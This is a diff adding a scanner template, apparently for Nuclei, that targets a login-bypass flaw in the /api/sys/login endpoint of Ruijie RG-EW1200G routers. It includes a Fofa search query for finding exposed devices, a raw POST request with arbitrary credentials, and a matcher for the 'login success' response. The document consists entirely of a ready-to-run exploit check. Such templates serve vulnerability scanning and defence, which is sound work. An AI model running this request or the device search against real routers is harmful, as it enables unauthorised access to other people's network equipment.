@@ -1,0 +1,35 @@
+id: RuiJie_RG-EW1200G_Login_bypass
+
+info:
+  name: RuiJie_RG-EW1200G_Login_bypass
+  author: HK
+  severity: high
+  description: 锐捷网络RG-EW1200G /api/sys/login接口存在登录绕过逻辑漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="static/css/app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /api/sys/login HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Length: 66
+
+    {"username":"2","password":"1231111111","timestamp":1692412880000}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - 登入成功
